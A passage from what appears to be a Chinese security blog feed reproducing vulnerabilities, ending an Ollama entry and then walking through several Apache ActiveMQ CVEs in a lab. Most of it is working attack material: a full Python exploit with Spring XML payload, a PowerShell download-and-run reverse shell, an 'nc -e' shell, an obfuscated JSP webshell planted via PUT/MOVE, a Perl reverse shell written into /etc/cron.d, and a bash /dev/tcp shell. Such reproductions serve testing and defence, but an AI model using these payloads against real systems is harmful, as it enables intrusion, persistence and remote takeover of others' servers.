http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/api/push</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.244.133:11434<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><br><span class="language-json"><span class="hljs-punctuation">&#123;</span></span><br><span class="language-json">  <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;192.168.244.133/rogue/bi0x&quot;</span><span class="hljs-punctuation">,</span> </span><br><span class="language-json">  <span class="hljs-attr">&quot;insecure&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span>                     </span><br><span class="language-json"><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure><p><img src="0408c31253cd8b983aec20137a3135f0.png" alt="image.png"></p><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p><p>通过推送后处理，执行读取&#x2F;etc&#x2F;passwd文件，windows下运行的server.py</p><p><img src="c592f0f2c827d2ddfc02550f1da882f0.png" alt="image.png"></p><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p><h2 id="0x06-修复方式"><a href="#0x06-修复方式" class="headerlink" title="0x06 修复方式"></a>0x06 修复方式</h2><p>升级至0.1.34以上版本</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.vicarius.io/vsociety/posts/probllama-in-ollama-a-tale-of-a-yet-another-rce-vulnerability-cve-2024-37032">Probllama in Ollama: A tale of a yet another RCE vulnerability (CVE-2024-37032) - vsociety</a> <a href="https://peterjxl.com/Docker/mirro/">Docker配置国内镜像源 | 从01开始</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Ollama</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ActiveMQ漏洞历史整合复现</title>
    <link href="/2025/03/21/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%8E%86%E5%8F%B2%E6%95%B4%E5%90%88%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/03/21/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%8E%86%E5%8F%B2%E6%95%B4%E5%90%88%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h3 id="Apache-ActiveMQ-Jolokia-REST-API-未授权访问漏洞（CVE-2024-32114）"><a href="#Apache-ActiveMQ-Jolokia-REST-API-未授权访问漏洞（CVE-2024-32114）" class="headerlink" title="Apache ActiveMQ Jolokia REST API 未授权访问漏洞（CVE-2024-32114）"></a>Apache ActiveMQ Jolokia REST API 未授权访问漏洞（CVE-2024-32114）</h3><h4 id="0x01-利用条件"><a href="#0x01-利用条件" class="headerlink" title="0x01 利用条件"></a>0x01 利用条件</h4><p>权限要求：无需权限</p><p>其他条件：允许远程访问</p><h4 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h4><p>6.0.0 &lt;&#x3D; Apache ActiveMQ &lt; 6.1.2</p><h4 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h4><p>访问&#x2F;api&#x2F;jolokia可看到相关信息</p><p><img src="1724840553370-3f0853b3-9bbb-4f59-b224-bc5c63714031-1742559432764-2.png" alt="img"></p><p>获取AactiveMQ代理消息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plain">GET /api/jolokia/read/org.apache.activemq:type=Broker,brokerName=localhost HTTP/1.1<br>Host: 192.168.187.129:8161<br>Pragma: no-cache<br>Cache-Control: no-cache<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Accept-Encoding: gzip, deflate, br<br>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6<br>Connection: close<br></code></pre></td></tr></table></figure><p><img src="1724840464486-13cbf490-dddf-4989-91d7-02b16b806ec1.png" alt="img"></p><p>列出所有队列</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plain">GET /api/jolokia/read/org.apache.activemq:type=Broker,brokerName=localhost,destinationType=Queue,destinationName=* HTTP/1.1<br>Host: 192.168.187.129:8161<br>Pragma: no-cache<br>Cache-Control: no-cache<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Accept-Encoding: gzip, deflate, br<br>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6<br>Connection: close<br></code></pre></td></tr></table></figure><p><img src="1724840509720-e10f423b-7628-49bf-b3e1-5e4238f82932.png" alt="img"></p><p>向队列发送消息，从上面知道有队列“1”。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plain">POST /api/message/1 HTTP/1.1<br>Host: 192.168.187.129:8161<br>Connection: close<br>Content-Type: application/json<br>Content-Length: 80<br><br>&#123;<br>  &quot;body&quot;: &quot;Hello, World!&quot;,<br>  &quot;properties&quot;: &#123;<br>    &quot;JMSPriority&quot;: 4<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="1724838678598-dcc6757d-0559-49e7-9319-11830805689c.png" alt="img"></p><p>删除队列中的消息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plain">POST /api/jolokia/ HTTP/1.1<br>Host: 192.168.187.129:8161<br>Origin:localhost:8161<br>Connection: close<br>Content-Type: application/json<br>Content-Length: 157<br><br><br>&#123;<br>  &quot;type&quot;: &quot;exec&quot;,<br>  &quot;mbean&quot;: &quot;org.apache.activemq:type=Broker,brokerName=localhost,destinationType=Queue,destinationName=1&quot;,<br>  &quot;operation&quot;: &quot;purge&quot;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="1724838801755-b83f41a5-78da-4c89-8ce5-f48509ea095f.png" alt="img"></p><h3 id="Apache-ActiveMQ-远程代码执行漏洞-CVE-2023-46604"><a href="#Apache-ActiveMQ-远程代码执行漏洞-CVE-2023-46604" class="headerlink" title="Apache ActiveMQ 远程代码执行漏洞(CVE-2023-46604)"></a>Apache ActiveMQ 远程代码执行漏洞(CVE-2023-46604)</h3><h4 id="0x01-利用条件-1"><a href="#0x01-利用条件-1" class="headerlink" title="0x01 利用条件"></a>0x01 利用条件</h4><p>权限要求：无需权限</p><p>其他条件：允许远程访问</p><h4 id="0x02-影响版本-1"><a href="#0x02-影响版本-1" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h4><p>Apache AchtiveMQ &lt;&#x3D; 5.18.2</p><h4 id="0x03-漏洞复现-1"><a href="#0x03-漏洞复现-1" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h4><p><img src="1724601155289-ada7dcff-dbf2-4a18-9b22-d94a537c0335.png" alt="img"></p><p>编写一个python脚本，需要远程加载poc.xml进行利用，因此需要在poc所在目录利用python搭建一个简易的http服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">python -m http.server 8000<br></code></pre></td></tr></table></figure><p>exploit.py详细代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs plain">import socket <br>import argparse <br> <br>def main(ip, port, url): <br>    if not ip or not url: <br>        print(&quot;Usage: script.py -i &lt;ip&gt; -p &lt;port&gt; -u &lt;url&gt;&quot;) <br>        return <br>     <br>    banner() <br>     <br>    class_name = &quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot; <br>    message = url <br> <br>    header = &quot;1f00000000000000000001&quot; <br>    body = header + &quot;01&quot; + int2hex(len(class_name), 4) + string2hex(class_name) + &quot;01&quot; + int2hex(len(message), 4) + string2hex(message) <br>    payload = int2hex(len(body) // 2, 8) + body <br>    data = bytes.fromhex(payload) <br> <br>    print(&quot;[*] Target:&quot;, f&quot;&#123;ip&#125;:&#123;port&#125;&quot;) <br>    print(&quot;[*] XML URL:&quot;, url) <br>    print() <br>    print(&quot;[*] Sending packet:&quot;, payload) <br> <br>    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM) <br>    conn.connect((ip, int(port))) <br>    conn.send(data) <br>    conn.close() <br> <br>def banner(): <br>    print(&quot;     _        _   _           __  __  ___        ____   ____ _____ \n    / \\   ___| |_(_)_   _____|  \\/  |/ _ \\      |  _ \\ / ___| ____|\n   / _ \\ / __| __| \\ \\ / / _ \\ |\\/| | | | |_____| |_) | |   |  _|  \n  / ___ \\ (__| |_| |\\ V /  __/ |  | | |_| |_____|  _ &lt;| |___| |___ \n /_/   \\_\\___|\\__|_| \\_/ \\___|_|  |_|\\__\\_\\     |_| \\_\\\\____|_____|\n&quot;) <br> <br>def string2hex(s): <br>    return s.encode().hex() <br> <br>def int2hex(i, n): <br>    if n == 4: <br>        return format(i, &#x27;04x&#x27;) <br>    elif n == 8: <br>        return format(i, &#x27;08x&#x27;) <br>    else: <br>        raise ValueError(&quot;n must be 4 or 8&quot;) <br> <br>if __name__ == &quot;__main__&quot;: <br>    parser = argparse.ArgumentParser() <br>    parser.add_argument(&quot;-i&quot;, &quot;--ip&quot;, help=&quot;ActiveMQ Server IP or Host&quot;) <br>    parser.add_argument(&quot;-p&quot;, &quot;--port&quot;, default=&quot;61616&quot;, help=&quot;ActiveMQ Server Port&quot;) <br>    parser.add_argument(&quot;-u&quot;, &quot;--url&quot;, help=&quot;Spring XML Url&quot;) <br>    args = parser.parse_args() <br>     <br>    main(args.ip, args.port, args.url)<br></code></pre></td></tr></table></figure><p>poc.xml利用文件代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;<br>&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;<br>       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;<br>       xsi:schemaLocation=&quot;<br>     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;<br>    &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt;<br>        &lt;constructor-arg &gt;<br>            &lt;list&gt;<br>                &lt;value&gt;calc&lt;/value&gt;<br>            &lt;/list&gt;<br>        &lt;/constructor-arg&gt;<br>    &lt;/bean&gt;<br>&lt;/beans&gt;<br></code></pre></td></tr></table></figure><p>运行exploit.py，输入目标ip和端口，以及搭建的简易http服务链接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">python exploit.py -i 192.168.0.107 -p 61616 -u http://127.0.0.1:8000/poc.xml<br></code></pre></td></tr></table></figure><p><img src="1724256766046-f74ccf99-52d8-4c7c-9435-9dbe43dc89df.png" alt="img"></p><p>反弹shell操作：在攻击机开启nc端口，编写poc.xml输入攻击机ip</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;<br>       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;<br>       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;<br> <br>    &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt;<br>        &lt;constructor-arg&gt;<br>            &lt;list&gt;<br>                &lt;value&gt;powershell&lt;/value&gt;<br>                &lt;value&gt;-c&lt;/value&gt;<br>                &lt;value&gt;&lt;![CDATA[IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1&#x27;); Invoke-PowerShellTcp -Reverse -IPAddress 192.168.244.143 -Port 4444]]&gt;&lt;/value&gt;<br>            &lt;/list&gt;<br>        &lt;/constructor-arg&gt;<br>    &lt;/bean&gt;<br>&lt;/beans&gt;<br></code></pre></td></tr></table></figure><p>成功接收到shell</p><p><img src="1724298781667-d18c8d7b-30d8-4c39-a463-77ed2a2f151b.png" alt="img"></p><h3 id="Apache-ActiveMQ-Jolokia代码执行漏洞（CVE-2022-41678）"><a href="#Apache-ActiveMQ-Jolokia代码执行漏洞（CVE-2022-41678）" class="headerlink" title="Apache ActiveMQ Jolokia代码执行漏洞（CVE-2022-41678）"></a>Apache ActiveMQ Jolokia代码执行漏洞（CVE-2022-41678）</h3><h4 id="0x01-利用条件-2"><a href="#0x01-利用条件-2" class="headerlink" title="0x01 利用条件"></a>0x01 利用条件</h4><p>权限要求：admin权限</p><p>其他条件：Jolokia允许远程监控和管理</p><h4 id="0x02-影响版本-2"><a href="#0x02-影响版本-2" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h4><p>Apache ActiveMQ &lt; 5.16.6</p><p>5.17.0&lt; Apache ActiveMQ &lt; 5.17.4</p><h4 id="0x03-漏洞复现-2"><a href="#0x03-漏洞复现-2" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h4><p>Jolokia允许通过HTTP接口与JVM中的MBean，从而实现对应用程序进行监控、管理和配置。ActiveMQ配置了Jolokia服务可通过&#x2F;api&#x2F;Jolokia端口操作MBean。</p><p>post到&#x2F;api&#x2F;jolokia&#x2F;返回200，漏洞可利用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs plain">POST /api/jolokia/ HTTP/1.1<br>Host: 192.168.0.107:8161<br>Origin:localhost:8161<br>Authorization: Basic YWRtaW46YWRtaW4=<br>Connection: close<br>Content-Type: application/json<br>Content-Length: 146<br><br>&#123;<br>    &quot;type&quot;: &quot;EXEC&quot;,<br>    &quot;mbean&quot;: &quot;jdk.management.jfr:type=FlightRecorder&quot;,<br>    &quot;operation&quot;: &quot;setConfiguration&quot;,<br>    &quot;arguments&quot;: [4,&quot;&quot;]<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="1724577587029-22024e75-077e-4533-84ed-4c8e0fa4aeb6.png" alt="img"></p><p>poc地址：<a href="https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2022-41678/poc.py">https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2022-41678/poc.py</a>   （poc过长，在这里不做过多的展示）</p><p>通过poc.py上传jsp webshell</p><p><img src="1724526885429-a0decfa4-bcee-4b23-abd9-06225ff445a7.png" alt="img"></p><p><img src="1724529387115-fb27644d-0873-4917-8b0c-155752604cdf.png" alt="img"></p><p>反弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">nc 192.168.244.143 4444 -e cmd.exe<br></code></pre></td></tr></table></figure><p><img src="1724526912511-23663d9c-976b-416c-be6b-34382aea884b.png" alt="img"></p><p><img src="1724529264926-07f6b19b-7854-4058-9740-db37c155ba6f.png" alt="img"></p><h3 id="ActiveMQ-信息泄漏漏洞-CVE-2017-15709"><a href="#ActiveMQ-信息泄漏漏洞-CVE-2017-15709" class="headerlink" title="ActiveMQ 信息泄漏漏洞(CVE-2017-15709)"></a>ActiveMQ 信息泄漏漏洞(CVE-2017-15709)</h3><h4 id="0x01-利用条件-3"><a href="#0x01-利用条件-3" class="headerlink" title="0x01 利用条件"></a>0x01 利用条件</h4><p>权限要求：无需权限</p><h4 id="0x02-影响版本-3"><a href="#0x02-影响版本-3" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h4><p>Apache ActiveMQ &lt;&#x3D; 5.15.2</p><h4 id="0x03-漏洞复现-3"><a href="#0x03-漏洞复现-3" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h4><p>nmap探测目标开放端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">nmap -p- -A -O 192.168.244.143<br></code></pre></td></tr></table></figure><p><img src="1724685592570-e0f93781-ab0b-430e-b6e2-037682d83921.png" alt="img"></p><p>61616为Apache ActiveMQ消息队列，使用了OpenWire协议，暴露相关的信息。</p><p><img src="1724685462299-54616ed3-9879-48de-a981-1c0293292ac0.png" alt="img"></p><h3 id="Apache-ActiveMQ任意文件写入漏洞-CVE-2016-3088"><a href="#Apache-ActiveMQ任意文件写入漏洞-CVE-2016-3088" class="headerlink" title="Apache ActiveMQ任意文件写入漏洞(CVE-2016-3088)"></a>Apache ActiveMQ任意文件写入漏洞(CVE-2016-3088)</h3><h4 id="0x01-利用条件-4"><a href="#0x01-利用条件-4" class="headerlink" title="0x01 利用条件"></a>0x01 利用条件</h4><p>权限要求：无需权限</p><p>其他条件：开启fileserver应用，开启PUT请求</p><h4 id="0x02-影响版本-4"><a href="#0x02-影响版本-4" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h4><p>Apache ActiveMQ &lt; 5.14.0</p><h4 id="0x03-漏洞复现-4"><a href="#0x03-漏洞复现-4" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h4><p>ActiveMQ fileserver服务具有文件写入权限，但本身没有权限限制。</p><p>直接访问：</p><p><img src="1724583377929-3eef9ad0-08df-40af-b8f2-7de7f89895ea.png" alt="img"></p><p>无cookies上传，写入文件</p><p><img src="1724583530047-2fa244c4-5051-40ec-b526-79739bf645c4.png" alt="img"></p><p>由于fileserver不能上传jsp文件，因此先上传webshell.txt文件，后续利用MOVE转移到能执行的目录。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plain">PUT /fileserver/webshell.txt HTTP/1.1<br>Host: 192.168.244.143:8161<br>Content-Length: 774<br><br>&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot;  language=&quot;java&quot; %&gt;<br>&lt;%<br>    if(request.getParameter(&quot;cmd&quot;)!=null)&#123;<br>        Class rt = Class.forName(new String(new byte[] &#123; 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101 &#125;));  //java.lang.Runtime的ascll<br>        //exec   getRuntime<br>        Process e = (Process) rt.getMethod(new String(new byte[] &#123; 101, 120, 101, 99 &#125;), String.class).invoke(rt.getMethod(new String(new byte[] &#123; 103, 101, 116, 82, 117, 110, 116, 105, 109, 101 &#125;)).invoke(null), request.getParameter(&quot;cmd&quot;) );<br>        java.io.InputStream in = e.getInputStream();<br>        int a = -1;byte[] b = new byte[2048];out.print(&quot;&lt;pre&gt;&quot;);<br>        while((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125;out.print(&quot;&lt;/pre&gt;&quot;);<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><p><img src="1724382814963-85a2a39f-d1dc-45b0-af65-2af24960aba5.png" alt="img"></p><p><img src="1724382868739-e57075e6-c4fb-43ef-8db1-324070c7f9d8.png" alt="img"></p><p>通过默认口令查看绝对路径</p><p><img src="1724599755200-37c275e5-cd05-438f-8036-f38bca53db5b.png" alt="img"></p><p>MOVE转移到&#x2F;opt&#x2F;activemq&#x2F;webapps&#x2F;api&#x2F;路径下，并修改文件后缀为可利用后缀。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plain">MOVE /fileserver/webshell.txt HTTP/1.1<br>Destination: file:///opt/activemq/webapps/api/webshell.jsp<br>Host: 192.168.244.143:8161<br>Content-Length: 774<br><br>&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot;  language=&quot;java&quot; %&gt;<br>&lt;%<br>    if(request.getParameter(&quot;cmd&quot;)!=null)&#123;<br>        Class rt = Class.forName(new String(new byte[] &#123; 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101 &#125;));  //java.lang.Runtime的ascll<br>        //exec   getRuntime<br>        Process e = (Process) rt.getMethod(new String(new byte[] &#123; 101, 120, 101, 99 &#125;), String.class).invoke(rt.getMethod(new String(new byte[] &#123; 103, 101, 116, 82, 117, 110, 116, 105, 109, 101 &#125;)).invoke(null), request.getParameter(&quot;cmd&quot;) );<br>        java.io.InputStream in = e.getInputStream();<br>        int a = -1;byte[] b = new byte[2048];out.print(&quot;&lt;pre&gt;&quot;);<br>        while((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125;out.print(&quot;&lt;/pre&gt;&quot;);<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><p><img src="1724382897232-d4554bba-5263-4efe-9899-a7bf13d6298d.png" alt="img"></p><p><img src="1724382881852-9eceb668-f323-463d-9774-12b43c535680.png" alt="img"></p><p><img src="1724383015370-6085b85e-cd62-4dba-873f-d590426f2e4e.png" alt="img"></p><p><strong>反弹shell操作</strong></p><p>写入计划任务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">PUT /fileserver/root.txt HTTP/1.1<br>Host: 192.168.244.143:8161<br>Content-Length: 774<br><br>*/1 * * * * root /usr/bin/perl -e &#x27;use Socket;$i=&quot;172.16.69.142&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;<br></code></pre></td></tr></table></figure><p><img src="1724394253065-0eddb390-7807-4fb7-8257-76ed7e768b03.png" alt="img"></p><p>转移路径修改包名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">MOVE /fileserver/root.txt HTTP/1.1<br>Destination: file:///etc/cron.d/root<br>Host: 192.168.244.143:8161<br><br>*/1 * * * * root /usr/bin/perl -e &#x27;use Socket;$i=&quot;172.16.69.142&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;<br></code></pre></td></tr></table></figure><p><img src="1724394283758-7d90983c-eb7c-42e4-9a87-b30c581fcf6b.png" alt="img"></p><p>成功反弹shell</p><p><img src="1724394377638-19a6e84f-bf80-4920-a479-792e5b47f7db.png" alt="img"></p><p><img src="1724394401456-1a4bcaa1-6653-481d-aa98-f441eefd1745.png" alt="img"></p><h3 id="Apache-ActiveMQ反序列化漏洞（CVE-2015-5254）"><a href="#Apache-ActiveMQ反序列化漏洞（CVE-2015-5254）" class="headerlink" title="Apache ActiveMQ反序列化漏洞（CVE-2015-5254）"></a>Apache ActiveMQ反序列化漏洞（CVE-2015-5254）</h3><h4 id="0x01-利用条件-5"><a href="#0x01-利用条件-5" class="headerlink" title="0x01 利用条件"></a>0x01 利用条件</h4><p>权限要求：无需权限</p><h4 id="0x02-影响版本-5"><a href="#0x02-影响版本-5" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h4><p>Apache ActiveMQ &lt; 5.13.0</p><h4 id="0x03-漏洞复现-5"><a href="#0x03-漏洞复现-5" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h4><p>ActiveMQ默认配置下会启动8161（后台管理系统）和61616（tcp端口），利用nmap进行探测发现端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">nmap -p- -A -O 192.168.244.143<br></code></pre></td></tr></table></figure><p><img src="1724587958217-1878f441-3d38-4dbc-904a-c448acca33b8.png" alt="img"></p><p>ActiveMQ TCP 会序列化数据，通过write protocal序列化字节流。利用jmet制作一个带有命令执行的序列化 Java 消息服务对象（在同目录下创建一个external文件夹）</p><p><a href="https://github.com/matthiaskaiser/jmet">https://github.com/matthiaskaiser/jmet</a></p><p><strong>反弹shell</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">bash -i &gt;&amp; /dev/tcp/192.168.0.107/4444 0&gt;&amp;1<br></code></pre></td></tr></table></figure><p><img src="1724429227821-c72c5f69-87f3-47d7-9c3c-1a72f0184972.png" alt="img"></p><p><a href="https://www.toolhelper.cn/EncodeDecode/Base64">https://www.toolhelper.cn/EncodeDecode/Base64</a></p><figure class="highlight 